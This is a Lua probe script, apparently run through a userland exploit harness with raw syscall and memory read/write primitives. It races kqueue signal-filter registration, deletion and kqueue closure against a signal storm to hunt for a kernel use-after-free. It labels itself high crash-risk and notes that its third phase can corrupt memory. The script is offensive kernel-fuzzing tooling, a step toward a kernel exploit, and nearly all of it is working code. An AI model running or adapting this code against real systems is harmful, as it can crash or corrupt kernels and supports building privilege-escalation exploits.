-- CRASH_CLASS: HIGH
-- PROBE 771b: knote lifetime for EVFILT_SIGNAL
--
-- 771a proved EVFILT_SIGNAL registers, counts deliveries and deletes cleanly.
-- A signal knote is freed by three different paths (explicit EV_DELETE, a
-- oneshot delivery, and kqueue close), which is the shape of historical
-- kqueue UAFs.  [A] oneshot auto-delete churn, [B] many kqueues closed with a
-- knote armed, [C] a helper thread churning DELETE/ADD while the parent storms
-- signals.  [C] last because it is the one that can corrupt.
print("=== PROBE 771b: SIGNAL KNOTE CHURN ===")
local function to_num(v)
    if type(v)=="table" and v.tonumber then return v:tonumber() end
    if type(v)=="table" and v.h then return v.h*4294967296+v.l end
    return tonumber(v) or 0
end
local function mk(n) local t={} for k,v in pairs(syscall.pipe) do t[k]=v end t.syscall_no=n setmetatable(t,getmetatable(syscall.pipe)) return t end
local function U(a) a=to_num(a) return uint64(string.format("0x%08X%08X",math.floor(a/4294967296),a%4294967296)) end
local function call(sc,a1,a2,a3,a4,a5,a6)
    local ok,r=pcall(function() return sc(U(a1),U(a2),U(a3),U(a4),U(a5),U(a6)) end)
    if not ok then return "DEAD" end
    return to_num(r)
end
local function rd(a) local o,v=pcall(function() return memory.read_dword(a) end) if o then return to_num(v) end end
local function rq(a) local o,v=pcall(function() return memory.read_qword(a) end) if o then return to_num(v) end end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local function wq(a,v) pcall(function() memory.write_qword(a,v) end) end
local function ww(a,v) pcall(function() memory.write_word(a,v) end) end
local function zero(a,n) pcall(function() for i=0,n-8,8 do memory.write_qword(a+i,0) end end) end
local SIG=30
local EV_ADD,EV_DELETE,EV_ONESHOT=0x0001,0x0002,0x0010
local F_SIG=0xFFFA
local pid=call(mk(20),0,0,0,0,0,0)
local act=to_num(memory.alloc(0x40)); zero(act,0x40); wd(act,1)
call(mk(416),SIG,act,0,0,0,0)
local ev=to_num(memory.alloc(0x200)); local ts=to_num(memory.alloc(0x10))
local function reg(kq,ch) return call(mk(363),kq,ch,1,ev,1,ts) end
local function poll(kq,n) zero(ev,0x200); return call(mk(363),kq,0,0,ev,n or 4,ts) end
-- [A]
local kq=call(mk(362),0,0,0,0,0,0)
local ch=to_num(memory.alloc(0x40)); zero(ch,0x40)
wq(ch+0,SIG); ww(ch+8,F_SIG); ww(ch+10,EV_ADD+EV_ONESHOT)
local anomalies,delivered=0,0
for i=1,200 do
    local r=reg(kq,ch)
    if r~=0 then anomalies=anomalies+1 end
    call(mk(37),pid,SIG,0,0,0,0)
    local n=poll(kq,4)
    if n==1 then delivered=delivered+1 end
end
print(string.format("[A] oneshot churn: reg-fail=%d events=%d alive=%s",anomalies,delivered,tostring(call(mk(20),0,0,0,0,0,0))))
-- [B]
local kqs={}
for i=1,32 do
    local k=call(mk(362),0,0,0,0,0,0)
    if type(k)=="number" and k>0 then
        ww(ch+10,EV_ADD)
        reg(k,ch); kqs[#kqs+1]=k
    end
end
for i=1,64 do call(mk(37),pid,SIG,0,0,0,0) end
local closed=0
for _,k in ipairs(kqs) do if call(mk(6),k,0,0,0,0,0)==0 then closed=closed+1 end end
print(string.format("[B] kqueues=%d closed=%d alive=%s",#kqs,closed,tostring(call(mk(20),0,0,0,0,0,0))))
-- [C]
local kq2=call(mk(362),0,0,0,0,0,0)
local chd=to_num(memory.alloc(0x40)); zero(chd,0x40)
wq(chd+0,SIG); ww(chd+8,F_SIG); ww(chd+10,EV_DELETE)
ww(ch+10,EV_ADD)
reg(kq2,ch)
local prog=to_num(memory.alloc(8)); wd(prog,0)
local N=20000
local body = [[
local function to_num(v) if type(v)=="table" and v.tonumber then return v:tonumber() end if type(v)=="table" and v.h then return v.h*4294967296+v.l end return tonumber(v) or 0 end
local function U(a) a=to_num(a) return uint64(string.format("0x%08X%08X",math.floor(a/4294967296),a%4294967296)) end
local t={} for k,v in pairs(syscall.pipe) do t[k]=v end t.syscall_no=363 setmetatable(t,getmetatable(syscall.pipe))
local KQ,CHD,CH,TS,PROG,N = tonumber("!KQ!"),tonumber("!CHD!"),tonumber("!CH!"),tonumber("!TS!"),tonumber("!PROG!"),tonumber("!N!")
for i=1,N do
    pcall(function() t(U(KQ),U(CHD),1,0,0,U(TS)) end)
    pcall(function() t(U(KQ),U(CH),1,0,0,U(TS)) end)
    memory.write_dword(PROG,i)
end
]]
body=body:gsub("!KQ!",string.format("%d",kq2)):gsub("!CHD!",string.format("%d",chd)):gsub("!CH!",string.format("%d",ch)):gsub("!TS!",string.format("%d",ts)):gsub("!PROG!",string.format("%d",prog)):gsub("!N!",string.format("%d",N))
local ok,thr=pcall(run_lua_code_in_new_thread,body,{async=true})
print("[C] helper ok="..tostring(ok).." type="..type(thr))
local storm=0
while true do
    local p=rd(prog) or 0
    if p>=N then break end
    call(mk(37),pid,SIG,0,0,0,0)
    storm=storm+1
    if storm>300000 then break end
end
local p=rd(prog) or 0
print(string.format("[C] storm=%d progress=%d",storm,p))
print(string.format("[C] poll after=%s alive=%s",tostring(poll(kq2,4)),tostring(call(mk(20),0,0,0,0,0,0))))
ww(chd+10,EV_DELETE)
print(string.format("[D] delete=%s poll=%s alive=%s",tostring(reg(kq2,chd)),tostring(poll(kq2,4)),tostring(call(mk(20),0,0,0,0,0,0))))
print("=== 771b DONE ===")
